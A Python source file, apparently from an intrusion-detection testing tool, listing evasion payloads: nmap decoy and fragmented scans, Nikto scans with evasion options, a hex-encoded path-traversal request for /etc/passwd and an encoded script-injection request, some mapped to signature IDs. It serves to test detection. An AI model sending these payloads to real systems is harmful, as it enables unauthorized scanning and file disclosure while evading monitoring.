#!/usr/bin/env python
###
# @author $Author: sebastien.damaye $
# @version $Revision: 39 $
# @lastmodified $Date: 2011-05-12 16:37:19 +0200 (Thu, 12 May 2011) $
#

import ConfigParser

class EvasionTechniques():
    def __init__(self, target):
        # Read configuration
        self.config = ConfigParser.RawConfigParser()
        self.config.read('config.cfg')

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### Nmap decoy test (6th position)
        self.payloads.append([
            "Nmap decoy test (6th position)",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nmap'), '-sS', '-A', '-D', "192.168.100.1,192.168.100.2,192.168.100.3,192.168.100.4,192.168.100.5,ME", self._target],
            self.config.get('CLIENT','ipaddr')
            ])

        ### Nmap decoy test (7th position)
        self.payloads.append([
            "Nmap decoy test (7th position)",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nmap'), '-sS', '-A', '-D', "192.168.100.1,192.168.100.2,192.168.100.3,192.168.100.4,192.168.100.5,192.168.100.6,ME", self._target],
            self.config.get('CLIENT','ipaddr')
            ])

        ### Hex encoding
        self.payloads.append([
            "Hex encoding",
            "socket",
            80,
            """GET /index.php?page=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64 HTTP/1.1\r\nHost: 127.0.0.1\r\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041202 Firefox/1.0\r\n\r\n""",
            "1:1122:8"
            ])

        ### Nmap scan with fragmentation
        self.payloads.append([
            "Nmap scan with fragmentation",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nmap'), '-Pn', '-sS', '-A', '-f', self._target],
            "122:2:1"
            ])

        ### Nikto Random URI encoding
        self.payloads.append([
            "Nikto Random URI encoding",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '1'],
            ""
            ])

        ### Nikto Directory self reference
        self.payloads.append([
            "Nikto Directory self reference",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '2'],
            ""
            ])

        ### Nikto Premature URL ending
        self.payloads.append([
            "Nikto Premature URL ending",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '3'],
            ""
            ])

        ### Nikto Prepend long random string
        self.payloads.append([
            "Nikto Prepend long random string",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '4'],
            ""
            ])

        ### Nikto Fake paramater
        self.payloads.append([
            "Nikto Fake paramater",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '5'],
            ""
            ])

        ### Nikto TAB as request spacer
        self.payloads.append([
            "Nikto TAB as request spacer",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '6'],
            ""
            ])

        ### Nikto Change the case of the URL
        self.payloads.append([
            "Nikto Change the case of the URL",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '7'],
            ""
            ])

        ### Nikto Windows directory separator
        self.payloads.append([
            "Nikto Windows directory separator",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', '8'],
            ""
            ])

        ### Nikto Carriage return as request spacer
        self.payloads.append([
            "Nikto Carriage return as request spacer",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', 'A'],
            ""
            ])

        ### Nikto Binary value as request spacer
        self.payloads.append([
            "Nikto Binary value as request spacer",
            "command",
            [self.config.get('PATHS','sudo'), self.config.get('PATHS','nikto'), '-config', self.config.get('PATHS','niktoconf'), '-h', self._target, '-Plugins', 'cgi', '-evasion', 'B'],
            ""
            ])

        ### Javascript obfuscation
        self.payloads.append([
            "Javascript Obfuscation",
            "socket",
            80,
            """GET /index.php?page=%sCscript%3Ealert%28%29%3C%2Fscript%3E HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n""",
            ""
            ])

        return self.payloads

if __name__ == "__main__":
    print EvasionTechniques("192.168.100.48").getPayloads()